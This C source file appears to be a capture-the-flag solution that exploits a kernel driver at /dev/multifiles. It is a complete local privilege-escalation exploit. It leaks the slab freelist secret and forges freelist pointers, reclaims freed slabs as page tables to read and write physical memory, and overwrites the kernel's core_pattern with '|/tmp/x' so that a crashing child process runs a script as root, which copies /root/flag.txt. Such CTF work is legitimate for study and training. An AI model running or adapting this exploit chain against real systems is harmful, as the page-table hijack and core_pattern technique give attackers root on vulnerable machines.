#define _GNU_SOURCE

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

typedef uint64_t u64;
typedef int64_t i64;
typedef uint32_t u32;
typedef uint8_t u8;
typedef size_t usize;

#define LOG(fmt, ...) do { \
    printf(fmt "\n", ##__VA_ARGS__); \
} while (0)

#define SYSCHK(x) ({                          \
    __typeof__(x) __res = (x);               \
    if (__res == (__typeof__(x))-1) {        \
        perror(#x);                          \
        exit(1);                             \
    }                                        \
    __res;                                   \
})

#define CHECK(x, n) ({                       \
    __typeof__(x) __res = (x);              \
    if (__res != (n)) {                     \
        LOG("CHECK(%s) = %lld", #x,         \
            (long long)__res);              \
        exit(1);                            \
    }                                       \
    __res;                                  \
})

static void panic(const char *msg) {
    puts(msg);
    exit(1);
}

typedef struct {
    int fd;
    u64 addr;
    u64 id;
    u64 vuln_file_id;
} VulnSlab;

#define NUM_TRIES 64
#define NUM_PARTIAL_SLABS 9
#define NUM_PT_REGIONS 64

#define OBJ_SIZE 160
#define DATA_SIZE (16 * 8)
#define OBJS_PER_SLAB 25
#define DEFAULT_FLAGS 0x7d333a7b66746362ULL

#define TAIL_VULN_SEEK_OFFSET 56
#define FREELIST_PTR_OFFSET 80
#define MAX_RW_SIZE 64

#define PAGE_SIZE_ 0x1000UL
#define PTE_STRIDE_PAGES 512UL
#define PT_SECOND_CHUNK_OFFSET (PTE_STRIDE_PAGES * PAGE_SIZE_)
#define PT_SPRAY_REGION_SIZE ((NUM_PT_REGIONS + 2UL) * PT_SECOND_CHUNK_OFFSET)
#define PT_OVERLAP_QWORDS 6

#define DEV_PATH "/dev/multifiles"
#define CREATE_FILE 0x4010c701
#define DELETE_FILE 0x4004c702
#define SET_ACTIVE_FILE 0x4004c703

#define KERNEL_PHYS_BASE 0x200000UL
#define STEXT_STATIC 0xffffffff81000000UL
#define CORE_PATTERN_STATIC 0xffffffff8236d060UL
#define CORE_PATTERN_OFFSET (CORE_PATTERN_STATIC - STEXT_STATIC)
#define KERNEL_SCAN_START 0x0UL
#define KERNEL_SCAN_LEN   0x10000000UL

#define PTE_FLAG_PRESENT  (1ULL << 0)
#define PTE_FLAG_RW       (1ULL << 1)
#define PTE_FLAG_USER     (1ULL << 2)
#define PTE_FLAG_ACCESSED (1ULL << 5)
#define PTE_FLAG_DIRTY    (1ULL << 6)
#define PTE_FLAG_NX       (1ULL << 63)
#define USER_PTE_FLAGS (PTE_FLAG_PRESENT | PTE_FLAG_RW | PTE_FLAG_USER | PTE_FLAG_ACCESSED | PTE_FLAG_DIRTY | PTE_FLAG_NX)

typedef struct {
    u8 *region;
    u8 *rw_window;
    u64 pte_entries[PT_OVERLAP_QWORDS];
    u64 original_pte1;
} PageTableContext;

typedef struct {
    VulnSlab trigger;
    VulnSlab victim;
} AdjacentPair;

static u64 cache_secret = 0;
static PageTableContext g_pt = { 0 };

static const u8 stext_signature[] = {
    0x49, 0x89, 0xf7, 0x48, 0x8d, 0x25, 0x4e, 0x3f,
    0x20, 0x01, 0xb9, 0x01, 0x01, 0x00, 0xc0, 0x48,
    0x8d, 0x15, 0xea, 0xaf, 0x76, 0x01, 0x89, 0xd0,
    0x48, 0xc1, 0xea, 0x20, 0x0f, 0x30, 0xe8, 0x8d,
    0x03, 0x00, 0x00, 0x6a, 0x10, 0x48, 0x8d, 0x05,
    0x03, 0x00, 0x00, 0x00, 0x50, 0x48, 0xcb,
};

static long debug_pause_secs(const char *name) {
    const char *s = getenv(name);
    char *end = NULL;

    if (s == NULL || *s == '\0') {
        return 0;
    }

    errno = 0;
    long v = strtol(s, &end, 10);
    if (errno != 0 || end == s || *end != '\0' || v < 0) {
        return 0;
    }

    return v;
}

static void maybe_pause(const char *name) {
    long secs = debug_pause_secs(name);

    if (secs <= 0) {
        return;
    }

    LOG("pausing %ld seconds for %s", secs, name);
    sleep((unsigned int)secs);
}

static long debug_pause_index(const char *name) {
    return debug_pause_secs(name);
}

static int open_dev(void) {
    return SYSCHK(open(DEV_PATH, O_RDWR));
}

static u64 create_file_id(int fd, u64 id) {
    u8 buf[16] = { 0 };
    memcpy(buf, &id, sizeof(id));
    return SYSCHK(ioctl(fd, CREATE_FILE, buf));
}

static u64 create_file(int fd) {
    return create_file_id(fd, 0);
}

static void delete_file(int fd, u64 id) {
    SYSCHK(ioctl(fd, DELETE_FILE, id));
}

static void set_active_file(int fd, u64 id) {
    SYSCHK(ioctl(fd, SET_ACTIVE_FILE, id));
}

static u64 leak_next_freelist_ptr(int fd, u64 leaker_id) {
    set_active_file(fd, leaker_id);
    SYSCHK(lseek(fd, DATA_SIZE + 24, SEEK_SET));

    u8 buf[MAX_RW_SIZE] = { 0 };
    SYSCHK(read(fd, buf, sizeof(buf)));
    return *(u64 *)(buf + (FREELIST_PTR_OFFSET - 24));
}

static void set_next_freelist_ptr(int fd, u64 setter_id, u64 value) {
    set_active_file(fd, setter_id);
    SYSCHK(lseek(fd, DATA_SIZE + 24, SEEK_SET));

    u64 buf[MAX_RW_SIZE / sizeof(u64)] = { 0 };
    buf[7] = value;
    SYSCHK(write(fd, buf, sizeof(buf)));
}

static u64 swab_part(u64 n, u64 part) {
    return ((n >> (8 * part)) & 0xffULL) << (8 * (7 - part));
}

static u64 swab_u64(u64 n) {
    u64 out = 0;
    for (u64 i = 0; i < 8; i++) {
        out |= swab_part(n, i);
    }
    return out;
}

static u64 forge_safe_link(u64 dst, u64 ptr_addr) {
    return dst ^ cache_secret ^ swab_u64(ptr_addr);
}

static int fill_slab(void) {
    int fd = open_dev();

    for (usize i = 0; i < OBJS_PER_SLAB; i++) {
        create_file(fd);
    }

    return fd;
}

static VulnSlab initial_alloc_vuln_slab(u64 id) {
    int fd = open_dev();
    create_file_id(fd, id);

    VulnSlab slab = {
        .fd = fd,
        .addr = 0,
        .id = id,
        .vuln_file_id = 0,
    };

    return slab;
}

static void setup_vuln_slab(VulnSlab *slab, bool leak_cache_secret) {
    int fd = slab->fd;

    for (usize i = 0; i < OBJS_PER_SLAB - 1 - 3; i++) {
        create_file(fd);
    }

    u64 leaker_id = create_file(fd);
    u64 leak1 = leak_next_freelist_ptr(fd, leaker_id);

    u64 vuln_id = create_file(fd);
    u64 tail_id = create_file(fd);
    delete_file(fd, vuln_id);

    u64 leak2 = leak_next_freelist_ptr(fd, leaker_id);

    u64 slot2_addr = leak1 ^ leak2;
    u64 slot1_addr = slot2_addr - OBJ_SIZE;
    u64 slot3_addr = slot2_addr + OBJ_SIZE;

    slab->addr = slot2_addr - (OBJ_SIZE * (OBJS_PER_SLAB - 1));
    LOG("slab_addr: %lx, slot1_addr: %lx, slot2_addr: %lx", slab->addr, slot1_addr, slot2_addr);

    u64 secret = leak2 ^ swab_u64(slot1_addr + FREELIST_PTR_OFFSET);
    if (leak_cache_secret) {
        cache_secret = secret;
        LOG("Leaked kmem_cache secret: %lx\n", cache_secret);
    } else {
        assert(cache_secret == secret);
    }

    set_next_freelist_ptr(fd, tail_id, forge_safe_link(0, slot3_addr + FREELIST_PTR_OFFSET));

    create_file(fd);
    delete_file(fd, tail_id);
    delete_file(fd, vuln_id);

    set_next_freelist_ptr(fd, leaker_id, forge_safe_link(slot3_addr, slot1_addr + FREELIST_PTR_OFFSET));
    create_file(fd);
    slab->vuln_file_id = create_file(fd);

    LOG("slab corrupted");
}

static void vuln_slab_read_end(VulnSlab *slab, u8 *buf, usize len) {
    usize new_len = len + 8;
    if ((new_len % sizeof(u64)) != 0) {
        new_len += 8 - (new_len % sizeof(u64));
    }

    assert((new_len % sizeof(u64)) == 0);
    assert(new_len <= MAX_RW_SIZE - 8);

    set_active_file(slab->fd, slab->vuln_file_id);
    SYSCHK(lseek(slab->fd, TAIL_VULN_SEEK_OFFSET, SEEK_SET));

    u8 read_buf[MAX_RW_SIZE] = { 0 };
    SYSCHK(read(slab->fd, read_buf, new_len));
    memcpy(buf, read_buf + 8, len);
}

static void vuln_slab_write_end(VulnSlab *slab, const u8 *buf, usize len) {
    usize new_len = len + 8;
    if ((new_len % sizeof(u64)) != 0) {
        new_len += 8 - (new_len % sizeof(u64));
    }

    assert((new_len % sizeof(u64)) == 0);
    assert(new_len <= MAX_RW_SIZE - 8);

    set_active_file(slab->fd, slab->vuln_file_id);
    SYSCHK(lseek(slab->fd, TAIL_VULN_SEEK_OFFSET, SEEK_SET));

    u8 write_buf[MAX_RW_SIZE] = { 0 };
    memcpy(write_buf + 8, buf, len);
    SYSCHK(write(slab->fd, write_buf, new_len));
}

static bool is_plausible_pte_page(const u64 *entries) {
    u64 first = entries[0];

    if ((first & (PTE_FLAG_PRESENT | PTE_FLAG_RW | PTE_FLAG_USER)) !=
        (PTE_FLAG_PRESENT | PTE_FLAG_RW | PTE_FLAG_USER)) {
        return false;
    }

    if ((first & ~0xfffULL) == 0 || entries[1] != 0) {
        return false;
    }

    return true;
}

static void pin_cpu0(void) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(0, &set);
    SYSCHK(sched_setaffinity(0, sizeof(set), &set));
}

static void prepare_pt_region(PageTableContext *pt) {
    static const uintptr_t candidates[] = {
        0x40000000UL,
        0x50000000UL,
        0x60000000UL,
        0x70000000UL,
    };

    pt->region = MAP_FAILED;
    for (usize i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
        void *want = (void *)candidates[i];
        void *p = mmap(want, PT_SPRAY_REGION_SIZE, PROT_READ | PROT_WRITE,
            MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
        if (p == MAP_FAILED) {
            if (errno == EEXIST) {
                continue;
            }

            perror("mmap");
            exit(1);
        }

        pt->region = p;
        break;
    }

    if (pt->region == MAP_FAILED) {
        panic("failed to reserve aligned pt spray region");
    }

    if (((uintptr_t)pt->region % PT_SECOND_CHUNK_OFFSET) != 0) {
        panic("pt spray region is not 2 MiB aligned");
    }

    pt->rw_window = NULL;
    pt->original_pte1 = 0;
    pt->region[0] = 0x41;
    LOG("pt spray region: %p size=%#lx", pt->region, (unsigned long)PT_SPRAY_REGION_SIZE);
}

static void update_pte_window(VulnSlab *trigger_slab, u64 new_pte1) {
    u64 pair[2] = {
        g_pt.pte_entries[0],
        new_pte1,
    };

    vuln_slab_write_end(trigger_slab, (u8 *)pair, sizeof(pair));
    g_pt.pte_entries[1] = new_pte1;
}

static void remap_window_page(VulnSlab *trigger_slab, u64 phys_page) {
    void *window = g_pt.rw_window;

    if (window == NULL) {
        panic("rw window not initialized");
    }

    SYSCHK(mprotect(window, PAGE_SIZE_, PROT_NONE));
    update_pte_window(trigger_slab, phys_page | USER_PTE_FLAGS);
    SYSCHK(mprotect(window, PAGE_SIZE_, PROT_READ | PROT_WRITE));
}

static void read_phys(VulnSlab *trigger_slab, u64 phys, void *buf, usize len) {
    u8 *out = buf;

    while (len != 0) {
        u64 phys_page = phys & ~(PAGE_SIZE_ - 1);
        usize page_off = phys & (PAGE_SIZE_ - 1);
        usize chunk = PAGE_SIZE_ - page_off;
        if (chunk > len) {
            chunk = len;
        }

        remap_window_page(trigger_slab, phys_page);
        memcpy(out, g_pt.rw_window + page_off, chunk);

        phys += chunk;
        out += chunk;
        len -= chunk;
    }
}

static void write_phys(VulnSlab *trigger_slab, u64 phys, const void *buf, usize len) {
    const u8 *in = buf;

    while (len != 0) {
        u64 phys_page = phys & ~(PAGE_SIZE_ - 1);
        usize page_off = phys & (PAGE_SIZE_ - 1);
        usize chunk = PAGE_SIZE_ - page_off;
        if (chunk > len) {
            chunk = len;
        }

        remap_window_page(trigger_slab, phys_page);
        memcpy(g_pt.rw_window + page_off, in, chunk);

        phys += chunk;
        in += chunk;
        len -= chunk;
    }
}

static u64 find_kernel_phys_base(VulnSlab *trigger_slab) {
    u8 buf[sizeof(stext_signature)];

    for (u64 phys = KERNEL_SCAN_START + 0x1000; phys < KERNEL_SCAN_START + KERNEL_SCAN_LEN;
            phys += PAGE_SIZE_) {
        read_phys(trigger_slab, phys, buf, sizeof(buf));
        if (memcmp(buf, stext_signature, sizeof(stext_signature)) == 0) {
            LOG("found _stext physical base at %lx", phys);
            return phys;
        }
    }

    LOG("_stext scan failed, falling back to static kernel phys base");
    return KERNEL_PHYS_BASE;
}

static void write_file_or_die(const char *path, const void *buf, usize len, mode_t mode) {
    int fd = SYSCHK(open(path, O_CREAT | O_TRUNC | O_WRONLY, mode));
    CHECK(write(fd, buf, len), (ssize_t)len);
    SYSCHK(close(fd));
}

static void setup_core_pattern_files(void) {
    static const char script[] =
        "#!/bin/sh\n"
        "cp /root/flag.txt /tmp/flag.txt 2>/dev/null\n"
        "chmod 777 /tmp/flag.txt";

    write_file_or_die("/tmp/x", script, sizeof(script) - 1, 0777);
}

static void raise_core_soft_limit(rlim_t want) {
    struct rlimit rl;

    SYSCHK(getrlimit(RLIMIT_CORE, &rl));
    if (want > rl.rlim_max) {
        want = rl.rlim_max;
    }

    rl.rlim_cur = want;
    SYSCHK(setrlimit(RLIMIT_CORE, &rl));
}

static void trigger_core_pattern(void) {
    pid_t pid = SYSCHK(fork());
    if (pid == 0) {
        volatile u64 *p = (volatile u64 *)0;

        raise_core_soft_limit(RLIM_INFINITY);
        *p = 0x4141414141414141ULL;
        _exit(0);
    }

    SYSCHK(waitpid(pid, NULL, 0));
}

static void cleanup_rw_window(VulnSlab *trigger_slab) {
    if (g_pt.region == NULL || g_pt.rw_window == NULL) {
        return;
    }

    SYSCHK(mprotect(g_pt.rw_window, PAGE_SIZE_, PROT_NONE));
    update_pte_window(trigger_slab, g_pt.original_pte1);
    SYSCHK(munmap(g_pt.region, PT_SPRAY_REGION_SIZE));
    g_pt.region = NULL;
    g_pt.rw_window = NULL;
}

static void raise_nofile_soft_limit(rlim_t want) {
    struct rlimit rl;

    SYSCHK(getrlimit(RLIMIT_NOFILE, &rl));
    if (want > rl.rlim_max) {
        want = rl.rlim_max;
    }

    LOG("new file limit: %lu\n", (unsigned long)want);
    rl.rlim_cur = want;
    SYSCHK(setrlimit(RLIMIT_NOFILE, &rl));
}

static bool find_adjacent_pairs(VulnSlab *vuln_slab_list, AdjacentPair *pairs, usize *pair_count) {
    bool found = false;

    *pair_count = 0;
    for (usize i = 0; i < NUM_TRIES; i++) {
        u64 leak[3] = { 0 };
        vuln_slab_read_end(&vuln_slab_list[i], (u8 *)leak, sizeof(leak));

        if (leak[0] != 1 || leak[1] != DEFAULT_FLAGS || leak[2] >= NUM_TRIES) {
            continue;
        }

        pairs[*pair_count].trigger = vuln_slab_list[i];
        pairs[*pair_count].victim = vuln_slab_list[leak[2]];
        LOG("found adjacent slabs: %lu (%lx) - %lu (%lx)",
            i, pairs[*pair_count].trigger.addr, leak[2], pairs[*pair_count].victim.addr);
        (*pair_count)++;
        found = true;
    }

    return found;
}

static usize select_disjoint_pairs(AdjacentPair *pairs, usize pair_count, AdjacentPair *selected) {
    bool used[NUM_TRIES] = { 0 };
    usize selected_count = 0;

    for (usize i = 0; i < pair_count; i++) {
        u64 trigger_id = pairs[i].trigger.id;
        u64 victim_id = pairs[i].victim.id;

        if (trigger_id >= NUM_TRIES || victim_id >= NUM_TRIES) {
            continue;
        }

        if (used[trigger_id] || used[victim_id]) {
            continue;
        }

        selected[selected_count++] = pairs[i];
        used[trigger_id] = true;
        used[victim_id] = true;
        LOG("selected pair: %lu (%lx) -> %lu (%lx)",
            trigger_id, pairs[i].trigger.addr, victim_id, pairs[i].victim.addr);
    }

    return selected_count;
}

static void free_adjacent_victims(AdjacentPair *pairs, usize pair_count) {
    for (usize i = 0; i < pair_count; i++) {
        SYSCHK(close(pairs[i].victim.fd));
        LOG("freed victim slab %lu at %lx", pairs[i].victim.id, pairs[i].victim.addr);
    }
}

static bool reclaim_with_pte_spray(AdjacentPair *pairs, usize pair_count,
        PageTableContext *pt, VulnSlab *chosen_trigger) {
    long pause_at = debug_pause_index("MULTIFILES_PTE_PAUSE_AT");

    for (usize i = 0; i < NUM_PT_REGIONS; i++) {
        usize chunk_offset = (i + 1) * PT_SECOND_CHUNK_OFFSET;
        volatile u8 *pte_chunk = pt->region + chunk_offset;
        LOG("pte spray chunk[%zu] = %p", i, (void *)pte_chunk);
        *pte_chunk = (u8)(0x42 + i);
        if (pause_at >= 0 && (usize)pause_at == i) {
            maybe_pause("MULTIFILES_PTE_CHUNK_PAUSE");
        }

        for (usize j = 0; j < pair_count; j++) {
            vuln_slab_read_end(&pairs[j].trigger, (u8 *)pt->pte_entries,
                sizeof(pt->pte_entries));
            if (!is_plausible_pte_page(pt->pte_entries)) {
                continue;
            }

            *chosen_trigger = pairs[j].trigger;
            g_pt = *pt;
            g_pt.rw_window = pt->region + chunk_offset + PAGE_SIZE_;
            g_pt.original_pte1 = pt->pte_entries[1];

            LOG("reclaimed adjacent page as PTE page: spray=%zu trigger=%lu victim=%lu",
                i, pairs[j].trigger.id, pairs[j].victim.id);
            for (usize k = 0; k < PT_OVERLAP_QWORDS; k++) {
                LOG("pte[%zu] = %016lx", k, g_pt.pte_entries[k]);
            }
            return true;
        }
    }

    return false;
}

static void exploit(void) {
    int initial_slab_fds[NUM_PARTIAL_SLABS] = { 0 };
    VulnSlab *vuln_slab_list = calloc(NUM_TRIES, sizeof(*vuln_slab_list));
    AdjacentPair pairs[NUM_TRIES] = { 0 };
    AdjacentPair selected_pairs[NUM_TRIES] = { 0 };
    usize pair_count = 0;
    usize selected_pair_count = 0;
    VulnSlab trigger_slab = { 0 };

    if (vuln_slab_list == NULL) {
        panic("calloc failed");
    }

    prepare_pt_region(&g_pt);

    for (usize i = 0; i < NUM_PARTIAL_SLABS; i++) {
        initial_slab_fds[i] = fill_slab();
    }

    for (usize i = 0; i < NUM_TRIES; i++) {
        VulnSlab slab = initial_alloc_vuln_slab(i);
        setup_vuln_slab(&slab, i == 0);
        vuln_slab_list[i] = slab;
    }

    if (!find_adjacent_pairs(vuln_slab_list, pairs, &pair_count)) {
        panic("no adjacent slabs found");
    }

    selected_pair_count = select_disjoint_pairs(pairs, pair_count, selected_pairs);
    if (selected_pair_count == 0) {
        panic("no disjoint adjacent slab pairs found");
    }

    // Evict the current cpu slab before freeing victims and allocating PTE pages.
    fill_slab();

    for (usize i = 0; i < NUM_PARTIAL_SLABS; i++) {
        delete_file(initial_slab_fds[i], 0);
    }

    free_adjacent_victims(selected_pairs, selected_pair_count);
    maybe_pause("MULTIFILES_POST_FREE_PAUSE");

    if (!reclaim_with_pte_spray(selected_pairs, selected_pair_count, &g_pt, &trigger_slab)) {
        panic("failed to reclaim any adjacent victim slab as PTE page");
    }

    setup_core_pattern_files();

    static const char new_core_pattern[] = "|/tmp/x";
    char verify_buf[sizeof(new_core_pattern)] = { 0 };
    u64 kernel_phys_base = find_kernel_phys_base(&trigger_slab);
    u64 core_pattern_phys = kernel_phys_base + CORE_PATTERN_OFFSET;
    write_phys(&trigger_slab, core_pattern_phys, new_core_pattern, sizeof(new_core_pattern));
    read_phys(&trigger_slab, core_pattern_phys, verify_buf, sizeof(verify_buf));
    LOG("core_pattern overwritten at phys=%lx", (unsigned long)core_pattern_phys);
    LOG("core_pattern now: %s", verify_buf);
    cleanup_rw_window(&trigger_slab);

    trigger_core_pattern();

    if (access("/tmp/flag.txt", R_OK) == 0) {
        LOG("flag copied to /tmp/flag.txt");
    }

    sleep(1);

    system("cat /tmp/flag.txt");
}

int main(void) {
    puts("starting solve...");

    pin_cpu0();
    raise_nofile_soft_limit(4096);
    exploit();

    return 0;
}
